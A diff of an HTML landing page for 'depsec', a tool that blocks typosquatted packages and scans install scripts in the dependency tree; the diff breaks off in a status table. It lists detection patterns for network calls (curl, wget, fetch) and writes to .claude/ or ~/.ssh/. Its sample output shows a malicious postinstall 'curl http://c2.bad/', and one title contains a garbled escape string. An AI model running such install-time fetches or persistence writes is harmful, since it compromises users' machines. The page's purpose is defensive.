@@ -1,293 +1,939 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>depsec</title>
-    <style>
-        :root {
-            --bg: #0d1117;
-            --bg-elevated: #161b22;
-            --border: #30363d;
-            --text: #c9d1d9;
-            --text-dim: #8b949e;
-            --accent: #3fb950;
-            --warn: #d29922;
-            --danger: #f85149;
-            --link: #58a6ff;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>depsec — Dependency Security Gate</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1216;
+    --bg3: #141820;
+    --surface: #181d26;
+    --border: rgba(255,255,255,0.07);
+    --border-hi: rgba(255,255,255,0.14);
+    --acid: #b8ff5a;
+    --acid-dim: rgba(184,255,90,0.12);
+    --acid-glow: rgba(184,255,90,0.06);
+    --red: #ff4d4d;
+    --red-dim: rgba(255,77,77,0.1);
+    --amber: #ffaa33;
+    --text: #e8eaf0;
+    --muted: #6b7280;
+    --muted2: #9ca3af;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'DM Sans', sans-serif;
+  }
 
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-            font-size: 14px;
-            line-height: 1.6;
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 40px 24px;
-        }
+  html { scroll-behavior: smooth; }
 
-        h1 {
-            font-size: 32px;
-            font-weight: 600;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
-        }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 16px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
 
-        h1 span {
-            color: var(--text-dim);
-            font-weight: 400;
-        }
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
 
-        .tagline {
-            color: var(--text-dim);
-            font-size: 16px;
-            margin-bottom: 32px;
-            max-width: 600px;
-        }
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 40px;
+    height: 56px;
+    background: rgba(10,12,15,0.85);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+  }
 
-        h2 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-top: 40px;
-            margin-bottom: 16px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid var(--border);
-        }
+  .nav-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    text-decoration: none;
+  }
 
-        p { margin-bottom: 12px; }
+  .logo-mark { width: 32px; height: 32px; }
 
-        a { color: var(--link); text-decoration: none; }
-        a:hover { text-decoration: underline; }
+  .nav-wordmark {
+    font-family: var(--mono);
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    letter-spacing: -0.02em;
+  }
 
-        pre {
-            background: var(--bg-elevated);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            padding: 16px;
-            overflow-x: auto;
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
-            font-size: 13px;
-            line-height: 1.5;
-            margin: 12px 0 20px;
-        }
+  .nav-wordmark span { color: var(--acid); }
 
-        code {
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
-            font-size: 13px;
-            background: var(--bg-elevated);
-            padding: 2px 6px;
-            border-radius: 3px;
-            border: 1px solid var(--border);
-        }
+  .nav-links {
+    display: flex;
+    align-items: center;
+    gap: 28px;
+  }
 
-        pre code {
-            background: none;
-            padding: 0;
-            border: none;
-            font-size: 13px;
-        }
+  .nav-links a {
+    color: var(--muted2);
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 500;
+    transition: color 0.15s;
+    font-family: var(--mono);
+  }
 
-        .comment { color: var(--text-dim); }
-        .prompt { color: var(--text-dim); }
-        .cmd { color: var(--text); }
-        .arg { color: #79c0ff; }
-        .flag { color: #d2a8ff; }
-        .ok { color: var(--accent); }
-        .err { color: var(--danger); }
-        .warn { color: var(--warn); }
+  .nav-links a:hover { color: var(--text); }
 
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 16px 0 24px;
-            font-size: 13px;
-        }
+  .nav-cta {
+    background: var(--acid);
+    color: #0a0c0f !important;
+    padding: 6px 14px;
+    border-radius: 4px;
+    font-weight: 700 !important;
+    font-size: 12px !important;
+  }
 
-        th, td {
-            text-align: left;
-            padding: 8px 12px;
-            border-bottom: 1px solid var(--border);
-        }
+  .nav-cta:hover { opacity: 0.9; }
 
-        th {
-            color: var(--text-dim);
-            font-weight: 500;
-            border-bottom: 2px solid var(--border);
-        }
+  .hero {
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 120px 40px 80px;
+    text-align: center;
+  }
 
-        td:first-child {
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
-        }
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: var(--acid-dim);
+    border: 1px solid rgba(184,255,90,0.25);
+    border-radius: 2px;
+    padding: 4px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 500;
+    color: var(--acid);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-bottom: 36px;
+  }
 
-        ul {
-            margin: 12px 0 20px 20px;
-        }
+  .badge-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--acid);
+    animation: pulse 2s infinite;
+  }
 
-        li {
-            margin-bottom: 6px;
-        }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
 
-        .nav {
-            margin-bottom: 40px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid var(--border);
-        }
+  .hero-logo-large { margin-bottom: 32px; }
 
-        .nav a {
-            color: var(--text-dim);
-            margin-right: 24px;
-            font-size: 14px;
-        }
+  h1 {
+    font-family: var(--mono);
+    font-size: clamp(36px, 6vw, 72px);
+    font-weight: 700;
+    line-height: 1.05;
+    letter-spacing: -0.04em;
+    margin-bottom: 8px;
+  }
 
-        .nav a:hover {
-            color: var(--text);
-            text-decoration: none;
-        }
+  h1 .accent { color: var(--acid); }
 
-        footer {
-            margin-top: 60px;
-            padding-top: 20px;
-            border-top: 1px solid var(--border);
-            color: var(--text-dim);
-            font-size: 13px;
-        }
-    </style>
-<base target="_blank">
+  .hero-sub {
+    font-family: var(--mono);
+    font-size: clamp(14px, 2vw, 18px);
+    color: var(--muted);
+    font-weight: 400;
+    margin-bottom: 48px;
+    letter-spacing: 0.01em;
+  }
+
+  .hero-actions {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-bottom: 72px;
+  }
+
+  .btn-primary {
+    background: var(--acid);
+    color: #0a0c0f;
+    padding: 12px 24px;
+    border-radius: 4px;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    text-decoration: none;
+    letter-spacing: 0.02em;
+    transition: opacity 0.15s, transform 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); }
+
+  .btn-secondary {
+    background: transparent;
+    color: var(--muted2);
+    padding: 12px 24px;
+    border-radius: 4px;
+    border: 1px solid var(--border-hi);
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 500;
+    text-decoration: none;
+    transition: border-color 0.15s, color 0.15s;
+  }
+
+  .btn-secondary:hover { border-color: var(--acid); color: var(--acid); }
+
+  .terminal {
+    width: 100%;
+    max-width: 680px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    text-align: left;
+  }
+
+  .terminal-bar {
+    background: var(--bg3);
+    padding: 10px 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .dot-r { background: #ff5f57; }
+  .dot-y { background: #febc2e; }
+  .dot-g { background: #28c840; }
+
+  .terminal-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    margin-left: 8px;
+  }
+
+  .terminal-body {
+    padding: 20px 24px;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.8;
+  }
+
+  .t-prompt { color: var(--muted); }
+  .t-cmd { color: var(--text); }
+  .t-acid { color: var(--acid); }
+  .t-red { color: var(--red); }
+  .t-amber { color: var(--amber); }
+  .t-muted { color: var(--muted); }
+  .t-dim { color: #3d4550; }
+  .t-line { display: block; }
+
+  section {
+    position: relative;
+    z-index: 1;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 80px 40px;
+  }
+
+  .section-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--acid);
+    margin-bottom: 12px;
+  }
+
+  h2 {
+    font-family: var(--mono);
+    font-size: clamp(22px, 3.5vw, 36px);
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    line-height: 1.1;
+    margin-bottom: 16px;
+  }
+
+  .section-desc {
+    color: var(--muted2);
+    font-size: 16px;
+    max-width: 480px;
+    line-height: 1.7;
+    margin-bottom: 56px;
+  }
+
+  .divider {
+    position: relative;
+    z-index: 1;
+    height: 1px;
+    background: var(--border);
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+
+  .threats {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+
+  .threat-card {
+    background: var(--bg);
+    padding: 32px 28px;
+    transition: background 0.2s;
+  }
+
+  .threat-card:hover { background: var(--surface); }
+
+  .threat-icon { width: 36px; height: 36px; margin-bottom: 20px; }
+
+  .threat-title {
+    font-family: var(--mono);
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 10px;
+    letter-spacing: -0.01em;
+  }
+
+  .threat-body { font-size: 13px; color: var(--muted2); line-height: 1.65; }
+
+  .feature-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 64px;
+    align-items: start;
+    margin-bottom: 80px;
+  }
+
+  .feature-row.flip { direction: rtl; }
+  .feature-row.flip > * { direction: ltr; }
+
+  .feature-text .label {
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--acid);
+    margin-bottom: 12px;
+    display: block;
+  }
+
+  .feature-text h3 {
+    font-family: var(--mono);
+    font-size: 22px;
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    margin-bottom: 16px;
+    line-height: 1.2;
+  }
+
+  .feature-text p { color: var(--muted2); font-size: 14px; line-height: 1.75; margin-bottom: 20px; }
+
+  .check-list { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+
+  .check-list li {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted2);
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+  }
+
+  .check-list li::before { content: '✓'; color: var(--acid); font-weight: 700; flex-shrink: 0; }
+
+  .rule-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 12px; }
+
+  .rule-table th {
+    text-align: left;
+    padding: 10px 16px;
+    color: var(--muted);
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+  }
+
+  .rule-table td { padding: 12px 16px; border-bottom: 1px solid var(--border); color: var(--muted2); vertical-align: top; }
+  .rule-table tr:last-child td { border-bottom: none; }
+  .rule-table tr:hover td { background: var(--surface); }
+
+  .tag-crit {
+    display: inline-block;
+    background: var(--red-dim);
+    color: var(--red);
+    border: 1px solid rgba(255,77,77,0.2);
+    border-radius: 2px;
+    padding: 1px 7px;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+
+  .tag-coming {
+    display: inline-block;
+    background: rgba(255,170,51,0.08);
+    color: var(--amber);
+    border: 1px solid rgba(255,170,51,0.2);
+    border-radius: 2px;
+    padding: 1px 7px;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+
+  .rule-id { color: var(--acid); font-size: 11px; }
+
+  .lang-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+
+  .lang-cell { background: var(--bg); padding: 28px 24px; text-align: center; }
+
+  .lang-name { font-family: var(--mono); font-size: 14px; font-weight: 700; margin-bottom: 20px; color: var(--text); }
+
+  .lang-checks { display: flex; flex-direction: column; gap: 10px; }
+
+  .lang-check-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted2);
+  }
+
+  .ck { color: var(--acid); font-weight: 700; }
+  .wip { color: var(--amber); }
+
+  .install-steps { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+
+  .install-block { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+
+  .install-block-header {
+    padding: 12px 20px;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .step-num {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    background: var(--acid-dim);
+    border: 1px solid rgba(184,255,90,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
+    font-weight: 700;
+    color: var(--acid);
+  }
+
+  .install-code { padding: 20px; font-family: var(--mono); font-size: 12px; line-height: 2; color: var(--muted2); }
+  .install-code .kw { color: var(--acid); }
+  .install-code .str { color: var(--text); }
+
+  .roadmap-list { display: flex; flex-direction: column; gap: 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+
+  .rm-item {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    transition: background 0.15s;
+  }
+
+  .rm-item:last-child { border-bottom: none; }
+  .rm-item:hover { background: var(--surface); }
+
+  .rm-done { color: var(--acid); }
+  .rm-todo { color: var(--border-hi); }
+  .rm-text { color: var(--muted2); }
+  .rm-text.done { color: var(--text); }
+
+  footer {
+    position: relative;
+    z-index: 1;
+    border-top: 1px solid var(--border);
+    padding: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    max-width: 1180px;
+    margin: 0 auto;
+  }
+
+  footer a { color: var(--muted); text-decoration: none; }
+  footer a:hover { color: var(--acid); }
+
+  .footer-right { display: flex; gap: 24px; }
+
+  .arch-container { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 8px; overflow: hidden; }
+
+  @media (max-width: 768px) {
+    nav { padding: 0 20px; }
+    .nav-links { display: none; }
+    .threats { grid-template-columns: 1fr; }
+    .feature-row { grid-template-columns: 1fr; gap: 32px; }
+    .feature-row.flip { direction: ltr; }
+    .install-steps { grid-template-columns: 1fr; }
+    .lang-grid { grid-template-columns: 1fr; }
+    section { padding: 60px 20px; }
+  }
+</style>
 </head>
 <body>
-    <div class="nav">
-        <a href="https://github.com/org-cyber/depsec">GitHub</a>
-        <a href="#install">Install</a>
-        <a href="#status">Status</a>
-        <a href="#rules">Rules</a>
+
+<nav>
+  <a href="#" class="nav-logo">
+    <svg class="logo-mark" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="16,2 29,9 29,23 16,30 3,23 3,9" fill="#0f1216" stroke="#b8ff5a" stroke-width="1.5"/>
+      <line x1="8" y1="16" x2="24" y2="16" stroke="#b8ff5a" stroke-width="1.5" stroke-linecap="round"/>
+      <circle cx="13" cy="16" r="2.5" fill="#b8ff5a"/>
+      <line x1="13" y1="10" x2="13" y2="22" stroke="rgba(184,255,90,0.3)" stroke-width="0.5" stroke-dasharray="2,2"/>
+    </svg>
+    <span class="nav-wordmark">dep<span>sec</span></span>
+  </a>
+  <div class="nav-links">
+    <a href="#features">Features</a>
+    <a href="#rules">Rules</a>
+    <a href="#install">Install</a>
+    <a href="#roadmap">Roadmap</a>
+    <a href="https://github.com" class="nav-cta">↗ GitHub</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="hero-badge">
+    <span class="badge-dot"></span>
+    In response to Mini Shai-Hulud · May 2026
+  </div>
+
+  <div class="hero-logo-large">
+    <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="40,4 73,22 73,58 40,76 7,58 7,22" fill="#0f1216" stroke="#b8ff5a" stroke-width="2"/>
+      <line x1="15" y1="40" x2="65" y2="40" stroke="rgba(184,255,90,0.15)" stroke-width="12" stroke-linecap="round"/>
+      <line x1="15" y1="40" x2="65" y2="40" stroke="#b8ff5a" stroke-width="1" stroke-linecap="round"/>
+      <line x1="30" y1="28" x2="30" y2="52" stroke="#b8ff5a" stroke-width="2" stroke-linecap="round"/>
+      <line x1="40" y1="24" x2="40" y2="56" stroke="#b8ff5a" stroke-width="2" stroke-linecap="round"/>
+      <circle cx="52" cy="40" r="4" fill="#b8ff5a"/>
+      <circle cx="52" cy="40" r="7" fill="none" stroke="rgba(184,255,90,0.3)" stroke-width="1"/>
+    </svg>
+  </div>
+
+  <h1><span class="accent">dep</span>sec</h1>
+  <p class="hero-sub">// dependency security gate</p>
+
+  <div class="hero-actions">
+    <a href="#install" class="btn-primary">
+      <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1v8M4 6l3 3 3-3M2 11h10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Install from source
+    </a>
+    <a href="#features" class="btn-secondary">Read the docs →</a>
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <span class="dot dot-r"></span>
+      <span class="dot dot-y"></span>
+      <span class="dot dot-g"></span>
+      <span class="terminal-title">bash — depsec intercept</span>
     </div>
+    <div class="terminal-body">
+      <span class="t-line"><span class="t-prompt">~/project $ </span><span class="t-cmd">depsec install npm express</span></span>
+      <span class="t-line t-muted">  ┌ Resolving dependency tree...</span>
+      <span class="t-line t-muted">  │ express@4.19.2 → 52 sub-dependencies</span>
+      <span class="t-line t-muted">  │</span>
+      <span class="t-line t-muted">  ├ [GATE] Validating 53 package names...</span>
+      <span class="t-line t-acid">  │ ✓ All names pass registry + typosquat checks</span>
+      <span class="t-line t-muted">  │</span>
+      <span class="t-line t-muted">  ├ [SCAN] Quarantine extraction + rule scan...</span>
+      <span class="t-line t-acid">  │ ✓ 53/53 packages clean</span>
+      <span class="t-line t-muted">  │</span>
+      <span class="t-line t-acid">  └ CLEAN — proceeding with npm install</span>
+      <span class="t-line t-dim">&nbsp;</span>
+      <span class="t-line"><span class="t-prompt">~/project $ </span><span class="t-cmd">depsec install npm lodas</span></span>
+      <span class="t-line t-muted">  ┌ Resolving...</span>
+      <span class="t-line t-red">  │ ✗ BLOCKED: "lodas" not found in registry</span>
+      <span class="t-line t-amber">  │   Did you mean: lodash?</span>
+      <span class="t-line t-red">  └ Install aborted.</span>
+    </div>
+  </div>
+</div>
 
-    <h1>depsec <span>— dependency security gate</span></h1>
-    <p class="tagline">
-        Intercepts package installations before they touch your filesystem.
-        Validates names against typosquats. Scans the full dependency tree
-        for malicious code. Verifies every checksum.
-    </p>
+<div class="divider"></div>
 
-    <h2 id="install">Installation</h2>
-    <pre><code><span class="prompt">$</span> <span class="cmd">go</span> <span class="arg">install</span> github.com/org-cyber/depsec/cmd/depsec@latest
+<section id="problem">
+  <div class="section-label">// The problem</div>
+  <h2>The supply chain is<br>under attack</h2>
+  <p class="section-desc">Most tools scan your lockfile <em>after</em> install. By then, 50+ sub-dependencies have already executed arbitrary code on your machine.</p>
 
-<span class="comment"># Or build from source:</span>
-<span class="prompt">$</span> <span class="cmd">git</span> <span class="arg">clone</span> https://github.com/org-cyber/depsec.git
-<span class="prompt">$</span> <span class="cmd">cd</span> depsec
-<span class="prompt">$</span> <span class="cmd">go</span> <span class="arg">build</span> ./cmd/depsec</code></pre>
+  <div class="threats">
+    <div class="threat-card">
+      <svg class="threat-icon" viewBox="0 0 36 36" fill="none">
+        <rect x="2" y="8" width="32" height="20" rx="3" stroke="#ff4d4d" stroke-width="1.5"/>
+        <path d="M12 18h12M18 13v10" stroke="#ff4d4d" stroke-width="1.5" stroke-linecap="round"/>
+        <circle cx="28" cy="8" r="5" fill="#0a0c0f" stroke="#ff4d4d" stroke-width="1.5"/>
+        <path d="M26 8h4M28 6v4" stroke="#ff4d4d" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <div class="threat-title">Typosquats &amp; hallucinated packages</div>
+      <div class="threat-body">AI coding assistants suggest package names that don't exist. Attackers register those names and wait. One character off from <code style="color:var(--acid);font-size:11px">lodash</code> and you're compromised.</div>
+    </div>
+    <div class="threat-card">
+      <svg class="threat-icon" viewBox="0 0 36 36" fill="none">
+        <path d="M18 4L4 11v7c0 8 6 14 14 16 8-2 14-8 14-16v-7L18 4z" stroke="#ff4d4d" stroke-width="1.5"/>
+        <path d="M13 16l2 2" stroke="#ff4d4d" stroke-width="1.5" stroke-linecap="round"/>
+        <circle cx="18" cy="20" r="1.5" fill="#ff4d4d"/>
+      </svg>
+      <div class="threat-title">Install-time malware</div>
+      <div class="threat-body">Packages like the <strong style="color:var(--text)">Mini Shai-Hulud</strong> campaign run <code style="color:var(--acid);font-size:11px">postinstall</code> scripts that persist backdoors in <code style="color:var(--acid);font-size:11px">.claude/</code> and <code style="color:var(--acid);font-size:11px">.vscode/</code> — and survive <code style="color:var(--acid);font-size:11px">npm uninstall</code>.</div>
+    </div>
+    <div class="threat-card">
+      <svg class="threat-icon" viewBox="0 0 36 36" fill="none">
+        <circle cx="18" cy="18" r="14" stroke="#ff4d4d" stroke-width="1.5"/>
+        <path d="M18 10v8l5 5" stroke="#ff4d4d" stroke-width="1.5" stroke-linecap="round"/>
+        <circle cx="18" cy="18" r="2" fill="#ff4d4d"/>
+      </svg>
+      <div class="threat-title">Zero-CVE novel malware</div>
+      <div class="threat-body">Snyk, Dependabot, and OSV scan for <em>known</em> vulnerabilities. They won't catch a freshly-published malicious package with valid provenance and zero CVE history.</div>
+    </div>
+  </div>
+</section>
 
-    <p>Alias your package manager for transparent interception:</p>
-    <pre><code><span class="comment"># Add to ~/.zshrc or ~/.bashrc</span>
-<span class="cmd">alias</span> <span class="arg">npm</span>=<span class="arg">"depsec npm"</span>
-<span class="cmd">alias</span> <span class="arg">pip</span>=<span class="arg">"depsec pip"</span>
-<span class="cmd">alias</span> <span class="arg">cargo</span>=<span class="arg">"depsec cargo"</span></code></pre>
+<div class="divider"></div>
 
-    <h2>Usage</h2>
-    <pre><code><span class="prompt">$</span> <span class="cmd">depsec</span> <span class="arg">install</span> <span class="arg">npm</span> <span class="arg">express</span>
-<span class="ok">[depsec] ALLOWED: express@5.2.1</span>
-<span class="ok">[depsec] Scanned 45 unique packages in tree. Clean.</span>
-<span class="ok">[depsec] Proceeding with install.</span>
+<section id="features">
+  <div class="section-label">// Two-layer defense</div>
+  <h2>Intercept before<br>code runs</h2>
 
-<span class="prompt">$</span> <span class="cmd">depsec</span> <span class="arg">install</span> <span class="arg">npm</span> <span class="arg">this-is-fake</span>
-<span class="err">[depsec] BLOCKED: package "this-is-fake" not found in registry</span>
-<span class="err">           Did you mean: this-is-real?</span>
+  <div class="feature-row">
+    <div class="feature-text">
+      <span class="label">Layer 01 — Fast Gate</span>
+      <h3>Validate before<br>any download</h3>
+      <p>Before a single tarball touches disk, depsec queries the live registry, runs typosquat detection using Levenshtein distance and homoglyph normalization, and checks project context.</p>
+      <ul class="check-list">
+        <li>Registry existence check against npm, PyPI, crates.io</li>
+        <li>Levenshtein + homoglyph detection vs. top-10k packages</li>
+        <li>Cyrillic/Latin lookalike normalization</li>
+        <li>Project context scoring for new dependencies</li>
+      </ul>
+    </div>
+    <div class="arch-container">
+      <div class="terminal">
+        <div class="terminal-bar">
+          <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+          <span class="terminal-title">gate ch[27;1:3ueck</span>
+        </div>
+        <div class="terminal-body">
+          <span class="t-line t-muted">checking: <span class="t-acid">lodash</span></span>
+          <span class="t-line t-muted">  registry        <span class="t-acid">✓ exists</span></span>
+          <span class="t-line t-muted">  downloads/week  <span class="t-acid">✓ 42M</span></span>
+          <span class="t-line t-muted">  edit-distance   <span class="t-acid">✓ exact match</span></span>
+          <span class="t-line t-muted">  homoglyphs      <span class="t-acid">✓ none detected</span></span>
+          <span class="t-line t-muted">  in manifest     <span class="t-acid">✓ yes</span></span>
+          <span class="t-line">&nbsp;</span>
+          <span class="t-line t-acid">GATE PASS &lt; 12ms</span>
+          <span class="t-line">&nbsp;</span>
+          <span class="t-line t-muted">checking: <span class="t-red">lodashjs</span></span>
+          <span class="t-line t-muted">  registry        <span class="t-red">✗ not found</span></span>
+          <span class="t-line t-muted">  similar to      <span class="t-amber">lodash (dist:2)</span></span>
+          <span class="t-line">&nbsp;</span>
+          <span class="t-line t-red">GATE BLOCK — install aborted</span>
+        </div>
+      </div>
+    </div>
+  </div>
 
-<span class="prompt">$</span> <span class="cmd">depsec</span> <span class="arg">scan</span> <span class="arg">package-lock.json</span></code></pre>
+  <div class="feature-row flip">
+    <div class="feature-text">
+      <span class="label">Layer 02 — Scanner</span>
+      <h3>Scan every tarball<br>in quarantine</h3>
+      <p>Packages that pass the gate are downloaded to a quarantined temp directory. Every package in the full dependency tree — not just top-level — is extracted, checksummed, and scanned by a concurrent rule engine.</p>
+      <ul class="check-list">
+        <li>SHA1/SHA256 checksum vs. registry-declared hash</li>
+        <li>postinstall scripts with network calls</li>
+        <li>Writes to .claude/, .vscode/, ~/.ssh/</li>
+        <li>Obfuscated payloads and high-entropy strings</li>
+        <li>Full tree scan — depth-3 malware still caught</li>
+      </ul>
+    </div>
+    <div class="arch-container">
+      <div class="terminal">
+        <div class="terminal-bar">
+          <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+          <span class="terminal-title">scanner output</span>
+        </div>
+        <div class="terminal-body">
+          <span class="t-line t-muted">quarantine: /tmp/depsec-9f2a/</span>
+          <span class="t-line t-muted">scanning 53 packages [8 workers]</span>
+          <span class="t-line">&nbsp;</span>
+          <span class="t-line t-acid">✓ express@4.19.2 — clean</span>
+          <span class="t-line t-acid">✓ mime@1.6.0 — clean</span>
+          <span class="t-line t-acid">✓ qs@6.11.0 — clean</span>
+          <span class="t-line t-muted">  ... 48 more</span>
+          <span class="t-line">&nbsp;</span>
+          <span class="t-line t-red">✗ evil-dep@0.0.3 CRITICAL</span>
+          <span class="t-line t-red">  npm-postinstall-network</span>
+          <span class="t-line t-amber">  postinstall: curl http://c2.bad/</span>
+          <span class="t-line t-red">  npm-persistence-path</span>
+          <span class="t-line t-amber">  writes to: .claude/settings.json</span>
+          <span class="t-line">&nbsp;</span>
+          <span class="t-line t-red">BLOCKED — entire install aborted</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
 
-    <h2>Behavior</h2>
+<div class="divider"></div>
 
-    <p><strong>Gate checks</strong> (before any download):</p>
-    <ul>
-        <li><strong>Registry existence</strong> — 404 blocks immediately. Catches AI-hallucinated package names before an attacker can register them.</li>
-        <li><strong>Typosquat detection</strong> — Levenshtein distance + homoglyph normalization (Cyrillic <code>е</code> vs Latin <code>e</code>) against top-10,000 packages.</li>
-        <li><strong>Project context</strong> — Flags new dependencies in mature projects. A package not in your existing <code>package.json</code> gets stricter scrutiny.</li>
-    </ul>
+<section id="rules">
+  <div class="section-label">// Detection rules</div>
+  <h2>Current ruleset</h2>
+  <p class="section-desc">Deterministic Go code — no LLM hallucinations can accidentally allow malware through. Every block is auditable.</p>
 
-    <p><strong>Scanner checks</strong> (after quarantine download):</p>
-    <ul>
-        <li><strong>Install script analysis</strong> — <code>preinstall</code>, <code>postinstall</code>, <code>prepare</code> containing network calls (<code>curl</code>, <code>fetch</code>, <code>wget</code>, <code>node -e</code>).</li>
-        <li><strong>Persistence path detection</strong> — File writes to <code>.claude/</code>, <code>.vscode/</code>, <code>.github/workflows/</code>, or shell profiles.</li>
-        <li><strong>Full tree coverage</strong> — Not just the package you asked for. Every sub-dependency is resolved, downloaded, and scanned concurrently.</li>
-    </ul>
-
-    <p><strong>Checksum verification</strong> — Every tarball is verified against the registry's declared hash before extraction. Prevents CDN compromise or MITM substitution.</p>
-
-    <h2 id="status">Status</h2>
-    <table>
